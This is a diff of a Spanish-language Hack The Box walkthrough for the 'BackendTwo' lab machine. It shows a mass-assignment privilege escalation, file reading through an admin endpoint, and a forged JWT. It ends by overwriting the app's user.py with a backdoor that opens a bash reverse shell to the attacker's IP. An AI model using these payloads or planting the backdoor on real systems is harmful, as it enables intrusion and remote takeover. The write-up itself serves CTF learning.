@@ -1,4 +1,7 @@
 10.10.11.162 - BackendTwo
+
+![BackendTwo](https://user-images.githubusercontent.com/96772264/200113940-cf2cade7-9c6a-4b59-8f74-7b4d155fbec4.png)
+
 -------------------------
 
 # Part 1: Reconocieminto
@@ -31,6 +34,9 @@ Por ahora la máquina es identica a la Backend.
 000000203:   422        0 L      2 W        81 Ch       "signup"
 000000039:   422        0 L      3 W        172 Ch      "login"
 ```
+-------------------------
+# Part 2: Creacion de un usaurio
+
 Como en la anterior, vamos a crear un usaurio, siguiendo los pasos como nos dicen:
 ```console
 └─$ curl -s -X POST http://10.10.11.162/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"cucuxii@backendtwo.htb", "password":"cucucxii123"}' | jq  # -> {}
@@ -39,6 +45,8 @@ Como en la anterior, vamos a crear un usaurio, siguiendo los pasos como nos dice
 ```
 Al igual que en la primera **backend** tenemos un directorio /docs al que se accederá por navegador añadiendo el header del **Authorization: bearer** 
 con el [plugin](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/)
+
+![backendtwo2_2](https://user-images.githubusercontent.com/96772264/200114099-265d0d20-adf0-4a8c-9af1-3627c3c566f3.PNG)
 
 Al igual que la anterior maquina hay un directorio openapi.json con todas las rutas, puede que haya información interesante.
 ```console
@@ -53,6 +61,10 @@ En openapi son curiosas ciertas lineas:
 	"description": "Returns a file on the server. File name input is encoded in base64_url",
 ```
 Probé el endpoint de editar contraseña, pero me devolvió un 403 bad requests. 
+
+-------------------------
+# Part 3: Elevando privilegios con un Mass assignment attack
+
 - Este es mi usaurio
 ```
 {"guid":"89e788f8-d7a0-46c6-960a-5cfb38ebd217","email":"cucuxii@backendtwo.htb","profile":null,"last_update":null,"time_created":1667562252633,"is_superuser":false,"id":12}
@@ -72,6 +84,9 @@ curl -X 'PUT' 'http://10.10.11.162/api/v1/user/12/edit' \
 ```
 Ahora el campo profile que es el que nos han dado, se ha cambiado a "Test", como he dicho ese campo NOS LO HAN DADO, pero ¿Y si metemos otro paŕametro
 de cosecha propia? La diferencia entre el admin y nosotros es lo de **is_superuser**. Así que podríamos probar a meterlo
+
+![backendtwo2_4](https://user-images.githubusercontent.com/96772264/200114138-1ded0687-5abe-4c7d-89a8-099c4a857af8.PNG)
+
 ```console
 curl -X 'PUT' 'http://10.10.11.162/api/v1/user/12/edit' \
   -H 'accept: application/json' -H 'Content-Type: application/json' \
@@ -90,6 +105,10 @@ Ahora actualizamos el header en el navegador:
 └─$ curl -s -X GET http://10.10.11.162/api/v1/admin/ -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6Ik..." # -> {"results":true}
 ```
 Si, en efecto somos un superusaurio.
+
+-------------------------
+# Part 4: Leyendo archivos de la máquina
+
 Hay un endpoint que permite leer la flag del usaurio, pero la respuesta es diferente al de la máquina anterior.
 ```console
 └─$ curl -X 'GET' 'http://10.10.11.162/api/v1/admin/get_user_flag' \
@@ -101,8 +120,9 @@ No es una flag sino algo un poco raro, encima nos meten un salto de linea al fin
 Si lo decodificamos en base64 o en hexadecimal salen caracteres sin sentido.
 Este numero raro parece un md5sum del user.txt ```md5sum Backendtwo.md # -> 6b02f163d0984afcc4ea98b2685a2e92  Backendtwo.md```
 
-Nos dan tambien un endpoint para leer archivos de la máquina.
-En la web nos piden el archivo **/etc/passwd** que se queda así ```http://10.10.11.162/api/v1/admin/file/%2Fetc%2Fpasswd```
+Nos dan tambien un endpoint para leer archivos de la máquina. Meto **/etc/passwd** que se queda así ```http://10.10.11.162/api/v1/admin/file/%2Fetc%2Fpasswd```
+
+![backendtwo2_6](https://user-images.githubusercontent.com/96772264/200114171-81bc3805-5c98-4ec1-9f52-c4ef5fc708eb.PNG)
 
 Recordamos la linea que leímos en el openapi.json:
 ```"description": "Returns a file on the server. File name input is encoded in base64_url"```
@@ -161,6 +181,11 @@ Tenemos la key de la api para poder crear la cookie que nos de la gana.
 >>> jwt.encode(cookie, secret, "HS256")
 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A'
 ```
+Cambiamos la cookie
+
+-------------------------
+# Part 5: Sobreescribiendo el código fuente
+
 Como seria /home/htb/Test ? ```echo -n "/home/htb/test" | base64 -w0 | tr -d "=" # -> L2hvbWUvaHRiL3Rlc3Q=```
 ```console
 └─$ curl -X 'POST' 'http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL3Rlc3Q%3D' \
@@ -194,7 +219,6 @@ El archivo de los tres que determina esto es ```/home/htb/app/api/v1/endpoints/u
     if user_id == -666:
         import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.12/443 0>&1"')
 ```
-
 El marron esque hay que subir esto con curl en data. Es decir hay que trasnformar todo el contenido en un one-liner que meter dentro de un enorme curl
 Abri el user.py modificado con vim y aplique estos comandos:
 ```
@@ -205,10 +229,16 @@ Abri el user.py modificado con vim y aplique estos comandos:
 Con todo eso queda en un oneliner, el archivo se llamaria
 ```echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64 # -> L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk=```
 
+![backendtwo2_7](https://user-images.githubusercontent.com/96772264/200114230-ebbaa6e7-785b-4de5-8c4e-96f880af32eb.PNG)
+
 El resultado del one liner seria este:
 ```
 curl http://10.10.11.162/api/v1/admin/file/$(echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64) -H 'Content-Type: application/json' -d '{"file": "from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -> Any:\n    \"\"\"\n    Fetch a user by ID\n    \"\"\"\n    if user_id == 666:\n        import os; os.system('\''bash -c \"bash -i >& /dev/tcp/10.10.14.12/443 0>&1\"'\'')\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\"/{user_id}/edit\")\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Edit the profile of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.put(\"/{user_id}/password\")\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Update the password of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.post(\"/login\")\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -> Any:\n    \"\"\"\n    Get the JWT for a user with data from OAuth2 request form body.\n    \"\"\"\n    \n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\n    \n    with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\n\n    return {\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \"token_type\": \"bearer\",\n    }\n\n@router.post(\"/signup\", status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -> Any:\n    \"\"\"\n    Create new user without the need to be logged in.\n    \"\"\"\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"The user with this username already exists in the system\",\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n"}' -H 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A'
 ```
+
+-------------------------
+# Part 6: Dentro del sistema
+
 Una vez en el sistema, al igual que la máquina anterior, en la carpeta principal hay un auth.log con una contraseña que nos permitiría conectarnos
 como el usuario actual por ssh ```1qaz2wsx_htb!```
 Una vez dentro de la máquina, si haces ```sudo -l``` y pones la contraseña te sale un juego del wordle
